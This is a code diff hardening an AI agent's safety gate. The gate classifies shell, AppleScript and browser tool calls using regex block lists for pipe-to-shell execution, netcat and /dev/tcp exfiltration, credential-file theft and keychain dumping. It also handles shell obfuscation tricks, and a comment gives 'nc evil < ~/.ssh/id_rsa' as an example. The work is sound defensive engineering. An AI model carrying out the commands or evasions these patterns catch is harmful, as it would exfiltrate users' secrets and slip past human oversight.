@@ -1,6 +1,7 @@
 """Safety policy gate — action classification and confirmation (§6.7)."""
 from __future__ import annotations
 
+import ipaddress
 import re
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -31,21 +32,143 @@ _SECRET_VALUE_RE = re.compile(
     r"(?i)(password|secret|token|api[_-]?key)\s*[:=]\s*\S+"
 )
 
-# Shell patterns beyond shell_fx defaults
+# Shell patterns beyond shell_fx defaults (Phase 14 classifier-evasion hardening).
 _EXTRA_DESTRUCTIVE = [
-    r"\brm\s+-", r"\btrash\b", r"\bdelete\b", r"\bsend\b.*\bmail\b",
+    r"\brm\s+-", r"\btrash\b", r"\bdelete\b",
     r"\bchmod\b", r"\bmv\b.*/dev/null", r"\bstripe\b", r"\bpayment\b",
-    # remote-code execution: piping the network into a shell
-    r"\bcurl\b.*\|\s*(sh|bash|zsh)", r"\bwget\b.*\|\s*(sh|bash|zsh)",
-    # data exfiltration: uploading with curl, or netcat, or scp
-    r"\bcurl\b.*(-T\b|--upload-file|--data\b|-d\s+@)", r"\b(nc|netcat|ncat)\b",
-    r"\bscp\b.*@", r"\bsftp\b",
-    # credential material combined with egress (pipe/redirect/network) = exfil;
-    # a bare `cat .env.example` / `ls ~/.aws` is NOT flagged (avoid over-blocking)
-    r"(\.ssh/|id_rsa|id_ed25519|\.aws/|\.env\b|credentials|\.pem\b|keychain\b)"
-    r".*(\||>|curl|wget|\bnc\b|scp|http)",
+    # remote-code execution: piping ANY source into an interpreter (not just curl|sh)
+    r"\|\s*(sh|bash|zsh|dash|python[0-9.]*|perl|ruby|node|php|Rscript)\b",
+    # decode / eval / process-substitution → interpreter (non-piped)
+    r"\beval\s+[\"'$]",
+    r"\b(sh|bash|zsh|dash)\s+-c\s+[\"']?\$\(",
+    r"\b(sh|bash|zsh|dash)\s*<\(",
+    # rm / destroy via indirection (adjacency rule alone is too tight)
+    r"\bfind\b.*-exec\s+\S*\b(rm|unlink|shred|srm|dd|mv|chmod|chown|tee)\b",
+    r"\bxargs\b.*\b(rm|unlink|shred|srm)\b",
+    r"\$\(\s*(which|command\s+-v)\s+\w+\s*\)\s+-",
+    # data-exfil transports beyond curl-T/nc/scp
+    r"\bcurl\b.*(-T\b|--upload-file|--data\b|-d\s+@|-F\b|--form\b)",
+    r"\b(nc|netcat|ncat)\b", r"\bscp\b.*\s\S+:", r"\bsftp\b",
+    r"/dev/(tcp|udp)/", r"\|\s*ssh\b",
+    r"\bssh\b\s+\S+@?\S+\s+[\"'][^\"']*(>|\btee\b|\bcat\b|\bdd\b)",
+    r"\brsync\b.*\s\S+:",
+    r"\b(sendmail|mailx)\b", r"\bmail\s+-s\b",
+    r"\b(tftp|lftp|ncftp)\b", r"\bftp\b\s+-",
+    r"\bwget\b.*(--post-file|--post-data|--body-file|--body-data)",
+    r"\bopenssl\s+s_client\b.*<\s*/",
+    r"\b(dig|nslookup)\b.*\$\(",
+    r"\bcurl\b.*://\S*\?\S*\$\(",
+    # keychain / credential dumping
+    r"\bsecurity\s+(find|dump|export)[\w-]*password", r"\bsecurity\s+dump-keychain\b",
+    # inline interpreter code with filesystem/process/network side effects — the
+    # verb tail is the gate, so bare `python -c 'print(1)'` is NOT flagged
+    r"\b(python[0-9.]*|ruby|perl|node|php|deno|bun|lua|awk|gawk|mawk|osascript|Rscript|tclsh)\b"
+    r".*(rmtree|os\.system|os\.remove|os\.rmdir|\bunlink\b|subprocess|Popen|shutil"
+    r"|system\s*\(|rmSync|removeSync|rmdirSync|execSync|spawnSync|FileUtils\.rm|\brm_rf?\b"
+    r"|truncate|Deno\.remove|open\s*\([^)]*['\"][wa]"
+    r"|requests\.|urllib|http\.client|urlopen|smtplib|\bsocket\.|\.connect\(|\.send\("
+    r"|do\s+shell\s+script)",
 ]
 _EXTRA_DESTRUCTIVE_RE = re.compile("|".join(_EXTRA_DESTRUCTIVE), re.IGNORECASE)
+
+# Obfuscation normalization — a match-only scratch copy, NEVER executed.
+_IFS_RE = re.compile(r"\$\{?IFS\}?")
+_ASSIGN_RE = re.compile(r"\b([A-Za-z_]\w*)=([^\s;|&]+)")
+
+
+def _normalize_for_matching(cmd: str) -> str:
+    """Collapse shell obfuscations the raw regex misses: ${IFS} whitespace
+    substitution, trivial name=value command assembly (a=rm;$a), and quote/
+    backslash token splitting (r''m, ch\\mod). Scratch string for matching only."""
+    s = _IFS_RE.sub(" ", cmd)
+    for m in _ASSIGN_RE.finditer(cmd):
+        name, val = m.group(1), m.group(2).strip("'\"")
+        s = re.sub(r"\$\{?" + re.escape(name) + r"\}?", val, s)
+    return re.sub(r"""['"\\]""", "", s)
+
+
+# Credential material + an egress channel in ANY order = exfil (order-independent,
+# so `nc evil < ~/.ssh/id_rsa` is caught). Bare `cat .env.example` has no egress.
+_CRED_MATERIAL_RE = re.compile(
+    r"\.ssh\b|id_rsa|id_ed25519|id_ecdsa|\.aws\b|\.env\b|credentials|\.pem\b"
+    r"|\.p12\b|keychain\b|/etc/(passwd|shadow)|\.netrc\b|\.git-credentials",
+    re.IGNORECASE,
+)
+_EGRESS_RE = re.compile(
+    r"\||>|<|\bcurl\b|\bwget\b|\bnc\b|netcat|ncat|\bscp\b|\bsftp\b|\brsync\b"
+    r"|\bftp\b|http|/dev/(tcp|udp)",
+    re.IGNORECASE,
+)
+
+
+def _is_cred_exfil(cmd: str) -> bool:
+    return bool(_CRED_MATERIAL_RE.search(cmd) and _EGRESS_RE.search(cmd))
+
+
+def _shell_impact_destructive(cmd: str) -> bool:
+    """The Phase-14 shell gate as one function: raw command + de-obfuscated
+    scratch copy through is_destructive / _EXTRA_DESTRUCTIVE / _is_cred_exfil.
+    Single source of truth so AppleScript `do shell script` inherits it all."""
+    for c in (cmd, _normalize_for_matching(cmd)):
+        if (shell_fx.is_destructive(c) or _EXTRA_DESTRUCTIVE_RE.search(c)
+                or _is_cred_exfil(c)):
+            return True
+    return False
+
+
+# --- AppleScript (Phase 15): `do shell script` can run arbitrary shell, so route
+# extracted shell/keystroke literals through the SAME gate; the raw-source
+# fallback catches deeply-nested escaping. ---
+_AS_SHELL_RE = re.compile(r'\bdo\s+(?:shell\s+)?script\s+"((?:[^"\\]|\\.)*)"', re.IGNORECASE)
+_AS_KEYSTROKE_RE = re.compile(
+    r'\b(?:keystroke|set\s+the\s+clipboard\s+to)\s+"((?:[^"\\]|\\.)*)"', re.IGNORECASE)
+_AS_ADMIN_RE = re.compile(r"with\s+administrator\s+privileges", re.IGNORECASE)
+_AS_SENSITIVE_RE = re.compile("|".join([
+    r"\b(?:send|delete|remove|trash|push)\b",              # existing 5 (kept)
+    r"\bempty\s+(?:the\s+)?trash\b",
+    r'\bbutton\s+"(?:empty|delete|erase|move to trash|don.?t save|discard)"',
+    r"\bmove\b[^\n]*\bto\s+trash\b",
+    r"\b(?:restart|shut\s*down|log\s*out)\b",
+    r"\bdisplay\s+dialog\b[^\n]*\b(?:default\s+answer|hidden\s+answer)\b",
+]), re.IGNORECASE)
+
+
+def _as_unescape(s: str) -> str:
+    return re.sub(r"\\(.)", r"\1", s)
+
+
+# --- Browser (Phase 15): dangerous URLs independent of any allowlist — SSRF /
+# cloud-metadata / internal / non-http schemes. ---
+_SAFE_SCHEMES = frozenset({"http", "https"})
+_METADATA_HOSTS = frozenset({"metadata.google.internal"})
+# IPs with NO ipaddress is_* property that are still metadata endpoints.
+_METADATA_IPS = frozenset({"169.254.169.254", "100.100.100.200"})
+
+
+def _url_is_dangerous(url: str) -> bool:
+    if not url:
+        return False
+    try:
+        parsed = urlparse(url)
+    except Exception:  # noqa: BLE001
+        return True
+    scheme = (parsed.scheme or "").lower()
+    # scheme allowlist FIRST — file:/javascript:/data:/about: yield empty host
+    if scheme and scheme not in _SAFE_SCHEMES:
+        return True
+    host = (parsed.hostname or "").lower()
+    if not host:
+        return False
+    if host in _METADATA_HOSTS or host in _METADATA_IPS:
+        return True
+    if host == "localhost" or host.endswith(".localhost"):
+        return True
+    try:
+        addr = ipaddress.ip_address(host)
+    except ValueError:
+        return False  # ordinary hostname → allow (reputation isn't static)
+    return bool(addr.is_private or addr.is_loopback or addr.is_link_local
+                or addr.is_reserved or addr.is_unspecified)
 
 
 def normalize_file_roots(roots: list[str] | None) -> list[str]:
@@ -91,17 +214,24 @@ class Policy:
         name = spec.name
 
         if name == "run_shell":
-            cmd = args.get("command", "")
-            if shell_fx.is_destructive(cmd) or _EXTRA_DESTRUCTIVE_RE.search(cmd):
-                return "destructive"
-            return "reversible"
+            return ("destructive" if _shell_impact_destructive(args.get("command", ""))
+                    else "reversible")
 
         if name == "mail_compose":
             # Composing is reversible; sending would be destructive (not a tool yet)
             return "reversible"
 
-        if name in ("browser_navigate", "browser_click", "browser_fill"):
+        if name in ("browser_navigate", "browser_click", "browser_fill", "safari_open_url"):
             url = args.get("url", "")
+            if url and _url_is_dangerous(url):
+                # explicit allowlist entry overrides (legit localhost/internal opt-in)
+                host = ""
+                try:
+                    host = (urlparse(url).hostname or "").lower()
+                except Exception:  # noqa: BLE001
+                    pass
+                if not (host and self._host_in_allowlist(host)):
+                    return "destructive"
             if url and not self._network_allowed(url):
                 return "destructive"
             return "reversible"
@@ -112,10 +242,32 @@ class Policy:
         if spec.impact == "destructive":
             return "destructive"
 
-        # AppleScript with send/delete keywords
         if name == "run_applescript":
-            src = (args.get("source") or "").lower()
-            if any(k in src for k in ("send", "delete", "remove", "trash", "push")):
+            src = args.get("source") or ""
+            # (a) privilege escalation always confirms
+            if _AS_ADMIN_RE.search(src):
+                return "destructive"
+            # (b) route every embedded shell / keystroke / clipboard literal
+            #     through the SAME gate run_shell uses (inherits Phase-14 hardening)
+            for m in (*_AS_SHELL_RE.finditer(src), *_AS_KEYSTROKE_RE.finditer(src)):
+                if _shell_impact_destructive(_as_unescape(m.group(1))):
+                    return "destructive"
+            # nested-escape fallback: the destructive token is in the raw source too
+            if _shell_impact_destructive(src):
+                return "destructive"
+            # (c) egress: `open location` (dynamic or dangerous URL) / `mount volume`
+            for m in re.finditer(r"\bopen\s+location\b([^\n]*)", src, re.IGNORECASE):
+                tail = m.group(1)
+                if "&" in tail:  # URL built from shell/clipboard/contact output = exfil
+                    return "destructive"
+                lit = re.search(r'"([^"]*)"', tail)
+                if lit and (_url_is_dangerous(lit.group(1))
+                            or not self._network_allowed(lit.group(1))):
+                    return "destructive"
+            if re.search(r'\bmount\s+volume\s+"(?:smb|afp|ftps?|https?)://', src, re.IGNORECASE):
+                return "destructive"
+            # (d) broadened keyword / UI-automation set
+            if _AS_SENSITIVE_RE.search(src):
                 return "destructive"
 
         return spec.impact
@@ -177,6 +329,8 @@ class Policy:
     _EGRESS_TOOLS = frozenset({
         "browser_navigate", "browser_fill", "browser_click", "safari_open_url",
     })
+    # Arbitrary-code-execution tools — always surfaced under untrusted content.
+    _CODE_EXEC_TOOLS = frozenset({"run_shell", "run_applescript"})
 
     def is_rule_of_two_risk(
         self, spec: "ToolSpec", args: dict, untrusted_present: bool,
@@ -189,6 +343,12 @@ class Policy:
         if not untrusted_present:
             return False
         if self.impact_of(spec, args) == "destructive":
+            return True
+        if spec.name in self._CODE_EXEC_TOOLS:
+            # Arbitrary code execution under untrusted content ALWAYS confirms —
+            # enumerating every obfuscation (base64, ${IFS}, novel interpreters)
+            # is unwinnable, so flip to "a human approves any shell/AppleScript
+            # while untrusted content is on screen" (the durable Rule-of-Two fix).
             return True
         return spec.name in self._EGRESS_TOOLS
 
@@ -216,6 +376,11 @@ class Policy:
             host == allowed or host.endswith("." + allowed)
             for allowed in self.config.network_allowlist
         )
+
+    def _host_in_allowlist(self, host: str) -> bool:
+        """Explicit opt-in override for a dangerous host (e.g. localhost dev)."""
+        return any(host == a or host.endswith("." + a)
+                   for a in self.config.network_allowlist)
 
     def redact_text(self, text: str) -> str:
         """Redact secrets before sending context to cloud models."""
